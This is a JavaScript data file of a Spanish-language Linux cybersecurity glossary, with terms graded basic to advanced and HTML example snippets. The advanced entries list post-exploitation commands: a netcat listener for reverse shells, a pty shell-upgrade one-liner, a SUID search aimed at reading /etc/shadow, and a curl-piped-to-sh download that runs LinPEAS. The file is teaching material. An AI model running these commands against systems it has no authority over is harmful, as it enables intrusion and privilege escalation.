/* ========================================================
   UNDERCODE - BASE DE DATOS: CIBERSEGURIDAD EN LINUX (cyber)
   Categorizado por Niveles: Básico, Intermedio y Avanzado
   Incluye laboratorios interactivos y ejemplos prácticos
======================================================== */

export const CYBER_DATA = [
    // ==========================================
    // 🟢 NIVEL BÁSICO (Fundamentos y Conceptos)
    // ==========================================
    { 
        en: "Phishing", 
        es: "Suplantación de Identidad", 
        category: "cyber", 
        type: "teoria", 
        level: "basico",
        desc: "Método de ingeniería social que utiliza correos electrónicos, mensajes o páginas falsas para engañar a usuarios y robar credenciales.",
        examples: [
            "<strong>Caso de Uso 1: Phishing de Credenciales Corporativas</strong><br>El atacante clona el portal de inicio de sesión de Microsoft 365 y envía un correo urgente alegando una 'actualización de seguridad obligatoria' para capturar el usuario y password de la víctima.",
            "<strong>Mitigación efectiva en Linux:</strong><br>Configuración estricta de registros DNS como SPF, DKIM y DMARC en los servidores de correo para prevenir el spoofing o suplantación de dominios."
        ]
    },
    { 
        en: "Malware", 
        es: "Software Malicioso", 
        category: "cyber", 
        type: "teoria", 
        level: "basico",
        desc: "Término genérico para cualquier tipo de código o programa informático diseñado intencionalmente para dañar, infiltrarse o alterar un sistema.",
        examples: [
            "<strong>Clasificación Común:</strong><br>* Ransomware (Cifrado destructivo de datos).<br>* Troyanos (Acceso encubierto).<br>* Spyware (Espionaje y exfiltración de pulsaciones de teclado).",
            "<strong>Laboratorio de Detección básica en Linux:</strong><br>Análisis estático de un binario sospechoso usando el comando: <br><code>file binario_sospechoso</code><br><code>strings binario_sospechoso | grep -i 'http'</code>"
        ]
    },
    { 
        en: "Social Engineering", 
        es: "Ingeniería Social", 
        category: "cyber", 
        type: "teoria", 
        level: "basico",
        desc: "Técnica de manipulación psicológica utilizada por atacantes para inducir a las personas a ejecutar acciones específicas o revelar información confidencial.",
        examples: [
            "<strong>Técnica de Pretexting (Pretexto):</strong><br>El atacante llama a un empleado del helpdesk simulando ser un ejecutivo de alto rango que olvidó su contraseña debido a un viaje de negocios de última hora, presionando al técnico para que la restablezca sin verificar su identidad.",
            "<strong>Defensa Organizacional:</strong><br>Implementación de políticas estrictas de verificación de identidad de doble factor (2FA) humana antes de tramitar cualquier solicitud de soporte de TI crítica."
        ]
    },
    { 
        en: "whoami", 
        es: "Identificar Usuario Actual", 
        category: "cyber", 
        os: "linux",
        type: "comando", 
        level: "basico",
        desc: "Comando básico que muestra el nombre de usuario de la sesión actual en la terminal. Esencial en reconocimiento inicial tras comprometer un host.",
        examples: [
            "<strong>Ejemplo 1: Reconocimiento post-explotación</strong><br><code>whoami</code><br><small>Muestra inmediatamente el privilegio actual (ej. 'www-data' o 'root').</small>",
            "<strong>Ejemplo 2: Validación detallada de UID</strong><br><code>id</code><br><small>Complemento de auditoría para verificar a qué grupos de seguridad pertenece el usuario actual.</small>"
        ]
    },

    // ==========================================
    // 🟡 NIVEL INTERMEDIO (Herramientas y Hardening)
    // ==========================================
    { 
        en: "Port Scanning", 
        es: "Escaneo de Puertos", 
        category: "cyber", 
        type: "teoria", 
        level: "intermedio",
        desc: "Técnica utilizada para identificar qué puertos de comunicación están abiertos en un dispositivo, permitiendo descubrir servicios activos y vulnerabilidades.",
        examples: [
            "<strong>Mecánica del Escaneo TCP SYN (Half-Open):</strong><br>El atacante envía un paquete SYN. Si el objetivo responde con SYN-ACK, el puerto está abierto. El atacante rompe la conexión inmediatamente con un RST para evitar que la conexión se registre por completo.",
            "<strong>Detección local en Linux:</strong><br>Auditoría de puertos en escucha usando sockets de red nativos:<br><code>ss -tulpn</code> o <code>netstat -tulpn</code>"
        ]
    },
    { 
        en: "nmap", 
        es: "Mapeador de Redes", 
        category: "cyber", 
        type: "comando", 
        level: "intermedio",
        desc: "Herramienta de ciberseguridad avanzada para el descubrimiento de hosts, escaneo de puertos abiertos y auditorías de seguridad en la red.",
        examples: [
            "<strong>Ejemplo 1: Escaneo sigiloso con detección de versiones y OS</strong><br><code>nmap -sS -sV -O 192.168.1.1</code>",
            "<strong>Ejemplo 2: Auditoría agresiva con scripts de vulnerabilidades (NSE)</strong><br><code>nmap --script vuln 192.168.1.50</code><br><small>Ejecuta la base de datos de scripts de Nmap para verificar fallos conocidos como EternalBlue, Heartbleed, etc.</small>"
        ]
    },
    { 
        en: "Hardening", 
        es: "Endurecimiento de Sistemas", 
        category: "cyber", 
        type: "teoria", 
        level: "intermedio",
        desc: "Proceso de asegurar un sistema operativo mediante la reducción de su superficie de ataque, eliminando software, puertos y privilegios innecesarios.",
       
    },
    { 
        en: "ufw status", 
        es: "Estado del Firewall No Complicado", 
        category: "cyber", 
        os: "linux",
        type: "comando", 
        level: "intermedio",
        desc: "Comando utilizado en sistemas basados en Debian/Ubuntu para verificar el estado de las reglas activas del firewall local (Uncomplicated Firewall).",
        examples: [
            "<strong>Ejemplo 1: Verificación de reglas numeradas</strong><br><code>sudo ufw status numbered</code><br><small>Muestra las reglas con un índice numérico para facilitar su eliminación selectiva.</small>",
            "<strong>Ejemplo 2: Verificación de logs e informe detallado</strong><br><code>sudo ufw status verbose</code><br><small>Muestra información detallada sobre políticas por defecto (Deny/Allow) y estado de registro.</small>"
        ]
    },
    { 
        en: "fail2ban", 
        es: "Protección contra Intrusiones", 
        category: "cyber", 
        os: "linux",
        type: "teoria", 
        level: "intermedio",
        desc: "Framework de seguridad en Linux que monitorea los archivos de registro (logs) y banea temporal o permanentemente IPs que muestran comportamiento sospechoso como ataques de fuerza bruta.",
        examples: [
            "<strong>Flujo de Defensa Automatizado:</strong><br>Un bot intenta loguearse por SSH repetidamente fallando la autenticación. Fail2Ban detecta los intentos fallidos en <code>/var/log/auth.log</code>, y genera dinámicamente una regla en <code>iptables</code> o <code>nftables</code> para bloquear la dirección IP del atacante por 1 hora.",
            "<strong>Comando de auditoría del estado de una jaula (Jail):</strong><br><code>sudo fail2ban-client status sshd</code>"
        ]
    },

    // ==========================================
    // 🔴 NIVEL AVANZADO (Auditoría, Exploits y Post-Explotación)
    // ==========================================
    { 
        en: "Reverse Shell", 
        es: "Consola Inversa", 
        category: "cyber", 
        type: "teoria", 
        level: "avanzado",
        desc: "Técnica donde la máquina víctima inicia una conexión de terminal saliente hacia el atacante, evadiendo de forma efectiva las reglas restrictivas de los firewalls entrantes.",
       
    },
    { 
        en: "nc -lvnp", 
        es: "Escucha con Netcat", 
        category: "cyber", 
        type: "comando", 
        level: "avanzado",
        desc: "Comando de Netcat utilizado en la máquina del atacante para abrir un puerto en modo escucha (listen), numérico y detallado, esperando recibir una conexión saliente o Reverse Shell.",
        examples: [
            "<strong>Ejemplo 1: Levantar escucha estándar avanzada</strong><br><code>nc -lvnp 443</code><br><small>Explicación de banderas: l (Listen), v (Verbose/Detallado), n (No DNS resolution/Velocidad), p (Port).</small>",
            "<strong>Ejemplo 2: Estabilización de la shell recibida</strong><br>Una vez establecida la conexión inversa, ejecuta dentro de la terminal comprometida para obtener control interactivo completo:<br><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</code>"
        ]
    },
    { 
        en: "Privilege Escalation", 
        es: "Escalación de Privilegios", 
        category: "cyber", 
        type: "teoria", 
        level: "avanzado",
        desc: "Acto de explotar un bug, fallo de diseño o mala configuración en el sistema operativo para obtener acceso elevado a recursos protegidos (usualmente root).",
       
    },
    { 
        en: "find / -perm -4000 2>/dev/null", 
        es: "Buscar Binarios con SUID Activo", 
        category: "cyber", 
        os: "linux",
        type: "comando", 
        level: "avanzado",
        desc: "Comando de auditoría avanzada en Linux para localizar archivos que tienen asignado el permiso especial SUID. Crucial en fases de enumeración para escalación de privilegios.",
        examples: [
            "<strong>Ejemplo 1: Búsqueda global absoluta</strong><br><code>find / -perm -4000 -type f 2>/dev/null</code><br><small>Redirige todos los errores de permisos denegados (Permission Denied) a /dev/null para una lectura limpia.</small>",
            "<strong>Análisis de Explotación (GTFOBins):</strong><br>Si la salida reporta que binarios como <code>cp</code>, <code>nano</code> o <code>base64</code> tienen permisos SUID, el atacante puede leer archivos críticos del sistema protegidos (como <code>/etc/shadow</code>) y quebrar la seguridad del host."
        ]
    },
    { 
        en: "LinPeas", 
        es: "Script de Enumeración de Privilegios en Linux", 
        category: "cyber", 
        os: "linux",
        type: "comando", 
        level: "avanzado",
        desc: "Script automatizado avanzado que busca posibles vías de escalación de privilegios en el sistema local, analizando versiones de Kernel, tareas cron y archivos mal configurados.",
        examples: [
            "<strong>Ejemplo 1: Descarga y ejecución directa en memoria (Fileless execution)</strong><br><code>curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>",
            "<strong>Ejemplo 2: Guardar reporte con salida limpia sin colores</strong><br><code>sh linpeas.sh -q > /tmp/reporte_privesc.txt</code><br><small>Genera un análisis estático detallado para descargarlo y auditarlo remotamente en la máquina del analista.</small>"
        ]
    }
];
